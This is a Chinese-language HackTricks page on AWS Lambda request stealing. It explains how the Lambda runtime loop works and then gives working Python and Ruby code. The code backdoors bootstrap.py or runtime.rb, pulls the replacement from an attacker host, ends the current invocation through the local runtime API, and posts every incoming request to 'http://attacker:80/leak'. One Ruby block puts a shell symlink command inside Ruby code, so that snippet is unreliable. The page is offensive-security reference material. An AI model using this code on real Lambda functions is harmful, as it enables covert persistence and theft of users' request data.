# AWS - Lambda请求窃取

<details>

<summary><strong>支持HackTricks并获得福利！</strong></summary>

* 如果您想在HackTricks中看到您的公司广告，或者如果您想访问PEASS的最新版本或下载PDF版的HackTricks，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) **和** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github仓库提交PR来分享您的黑客技巧。**

</details>

## 简介 <a href="#python-runtime" id="python-runtime"></a>

这种攻击假设您对正在运行的Lambda有某种形式的**访问权限**。\
此外，需要注意的一点是**Lambda调用并不完全隔离**，它们是相互隔离的。它们可以在同一个执行环境中运行，尽管不是同时运行。有了这个理解，让我们开始分析这个环境。

### 隔离

Lambda使用了这些cgroups进行隔离：

<figure><img src="../../../../.gitbook/assets/image (1) (1) (4).png" alt=""><figcaption></figcaption></figure>

由于前缀'sandbox'与任何常见的容器引擎（如docker、podman、LXD、rkt）都不匹配，它可能是一种专有的容器引擎，该引擎可能在内部使用开源容器运行时，如[runC](https://github.com/opencontainers/runc)。

### Lambda的工作原理 <a href="#python-runtime" id="python-runtime"></a>

这似乎是Python Lambda的架构：

<figure><img src="../../../../.gitbook/assets/image (2) (6).png" alt=""><figcaption></figcaption></figure>

1. 容器外的一个进程，称为**init二进制文件中的“切片器”**，通过共享内存将调用事件发送给**init**进程。
2. init进程在端口9001上（硬编码）设置了一个HTTP服务器，暴露了几个端点：
   1. /2018-06-01/runtime/invocation/**next** - 获取下一个调用事件
   2. /2018-06-01/runtime/invocation/{invoke-id}/**response** - 返回调用处理程序的响应
   3. /2018-06-01/runtime/invocation/{invoke-id}/**error** - 返回执行错误
3. 在`bootstrap.py`中，以下循环**查询init进程是否有新事件**，然后**调用用户的函数**来处理它（这里运行您上传的请求处理程序）。

<figure><img src="../../../../.gitbook/assets/image (11) (4).png" alt=""><figcaption></figcaption></figure>

4. **处理程序的响应然后通过以下端点发送回init进程**：
   1. `/{invoke-id}/response` - 如果用户处理程序执行成功
   2. `/{invoke-id}/error` - 如果在处理调用过程中引发了异常

## 技术摘要 <a href="#python-runtime" id="python-runtime"></a>

可以通过恶意代码**替换引导脚本**，以便能够**拦截发送到Lambda函数的数据**。\
请注意，其他语言中的其他引擎也有另一个用该语言编写的**引导脚本**，因此这也可以在使用其他语言的其他Lambda中完成，而不仅仅是Python。

## Python <a href="#python-runtime" id="python-runtime"></a>

从Lambda中下载**`/var/runtime/bootstrap.py`**（或者只需启动**自己的Lambda**并获取它），然后添加将泄漏发送到Lambda的所有数据的后门。您只需要添加几行代码，如下所示：

<figure><img src="../../../../.gitbook/assets/image (2) (1) (3).png" alt=""><figcaption></figcaption></figure>

### 替换运行时

现在，有了新创建的**`boostrap.py`**，可以**下载**它，**结束当前Lambda调用**并运行它以**替换**合法的脚本：
```python
import os
from urllib import request

# Download bootstrap.py from your server
r = request.urlopen('http://attacker.com/bootstrap.py')
with open('/tmp/bootstrap.py', 'w') as f:
f.write(r.read().decode('utf-8'))

# Get invocation ID and end it
req = request.urlopen("http://127.0.0.1:9001/2018-06-01/runtime/invocation/next")
inv_id = req.headers["Lambda-Runtime-Aws-Request-Id"]
req = request.Request(f"http://127.0.0.1:9001/2018-06-01/runtime/invocation/{inv_id}/response", data=b"null")
req.add_header("Content-Type", "application/x-www-form-urlencoded")
request.urlopen(req)

# Start your bootstrap.py
os.system("python3 /tmp/bootstrap.py")
```
或者你也可以使用[twist\_runtime.py](https://github.com/twistlock/lambda-persistency-poc/blob/master/poc/twist\_runtime.py)，它将像之前一样结束调用，运行新的引导程序并窃取信息。

{% hint style="warning" %}
如果一个Lambda函数在5-15分钟内没有被使用，它将被关闭，并且所有的更改将在下一次调用时丢失。
{% endhint %}

## Ruby Runtime <a href="#ruby-runtime" id="ruby-runtime"></a>

在Ruby中，你想要后门的文件是**`/var/runtime/lib/runtime.rb`**文件（从系统中获取或运行你自己的Lambda函数）。

添加后门与Python版本一样简单：
```ruby
# Add a require at the beggining
require 'json'
require 'net/http'
[...]
# In the loop where the invocation is treated
begin
context = lambdaContext.new(raw_request)
uri = URI('http://attacker:80/leak')
Net::HTTP.post(uri,JSON.generate(request))
[...]
```
然后，你只需要在Python版本中做一个改变：

* **在一个目录中下载后门**
* 使用符号链接将`/var/runtime/lib/*`与后门所在的目录链接起来
* 结束当前的Lambda调用
```ruby
# You can get a ruby shell with 'irb' or run from shell with ruby -e "..."

require 'net/http'

# Downloading new script
uri = URI("http://attacker/rumtime.rb")
r = Net::HTTP.get_response(uri)
File.write("/tmp/rumtime.rb", r.body)

# Create symlink
ln -s /var/runtime/lib/* /tmp

# Terminate currrent invocation
uri = URI('http://127.0.0.1:9001/2018-06-01/runtime/invocation/next')
req = Net::HTTP.get_response(uri)
inv_id = req.header['Lambda-Runtime-Aws-Request-Id']
uri = URI('http://127.0.0.1:9001/2018-06-01/runtime/invocation/'+inv_id+'/response')
Net::HTTP.post(uri, 'null')
```
## 参考资料

* [https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/](https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/)

<details>

<summary><strong>支持 HackTricks 并获得福利！</strong></summary>

* 如果您想在 HackTricks 中看到您的公司广告，或者如果您想访问 PEASS 的最新版本或下载 PDF 版的 HackTricks，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获得[**官方 PEASS 和 HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来**分享您的黑客技巧**。

</details>
